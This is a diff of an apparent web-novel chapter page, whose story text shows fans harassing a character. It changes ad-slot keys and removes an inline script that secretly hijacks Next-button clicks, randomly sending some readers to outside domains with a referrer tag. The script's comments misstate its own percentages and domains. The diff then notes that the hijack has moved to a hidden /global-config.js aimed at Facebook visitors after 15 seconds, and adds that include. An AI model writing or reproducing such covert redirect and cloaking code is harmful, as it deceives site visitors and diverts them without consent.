@@ -2393,7 +2393,7 @@
                 <p>Vandalism? That&#39;s worth detention?</p>
                 <p>He could pay ten times the damages without blinking!</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
+                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
                 <p>This has to be the first time a top celeb got detained over something so trivial!</p>
                 <p>Fans flooded discussions with frantic comments.</p>
                 <p>Details? What exactly did he damage?</p>
@@ -2409,7 +2409,7 @@
                 <p>...</p>
                 <p>As more photos from the scene circulated, the truth became clearer.</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
+                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
                 <p>Fans who learned the full story went ballistic.</p>
                 <p>Is Sophia insane? Calling the cops on her own brother?</p>
                 <p>No wonder the Lowells hate her—she&#39;s twisted!</p>
@@ -2417,7 +2417,7 @@
                 <p>Why doesn&#39;t that viper just die?</p>
                 <p>Pearl Group, right? Let&#39;s storm their accounts, girls!</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
+                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
                 <p>The fan army mobilized swiftly.</p>
                 <p>Pearl Group&#39;s official account was the first target.</p>
                 <p>Then came Sophia&#39;s Composer T profile.</p>
@@ -2434,7 +2434,7 @@
                 <p>Even worse, major gossip accounts suddenly launched a coordinated attack.</p>
                 <p>All targeting Sophia Laurent.</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
             </div>
             
             <div class="font-controls">
@@ -2555,37 +2555,7 @@
             }
         });
 
-        // Intercept Next button clicks and redirect to external domain
-        // 5% -> n1.cuvupa.co.uk, 0.5% -> n1.nougmi.xyz, 94.5% normal
-        (function() {
-            const nextBtn = document.getElementById('next-chapter');
-            if (nextBtn && nextBtn.href) {
-                nextBtn.addEventListener('click', function(e) {
-                    const rand = Math.random();
-
-                    // 7% probability to redirect to cuvupa
-                    if (rand < 0.07) {
-                        e.preventDefault();
-                        const url = new URL(this.href, window.location.origin);
-                        const referrerDomain = window.location.hostname;
-                        const separator = url.search ? '&' : '?';
-                        const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
-                        window.location.href = externalUrl;
-                        console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
-                    // 0.5% probability to redirect to hotelterdekat
-                    } else if (rand < 0.075) {
-                        e.preventDefault();
-                        const url = new URL(this.href, window.location.origin);
-                        const referrerDomain = window.location.hostname;
-                        const separator = url.search ? '&' : '?';
-                        const externalUrl = `https://novel.hotelterdekat.id${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
-                        window.location.href = externalUrl;
-                        console.log('🔀 Redirecting to hotelterdekat with ref:', externalUrl);
-                    }
-                    // Otherwise, let the default link behavior work (92.5% probability)
-                });
-            }
-        })();
+        // Next 按钮的 FB 外部跳转逻辑已迁移至 /global-config.js（15s 后对 FB 用户生效）
 
         // Record reading history
         document.addEventListener('DOMContentLoaded', function() {
@@ -4220,5 +4190,6 @@
     });
   })();
 </script>
+<script src="/global-config.js"></script>
 </body>
 </html>
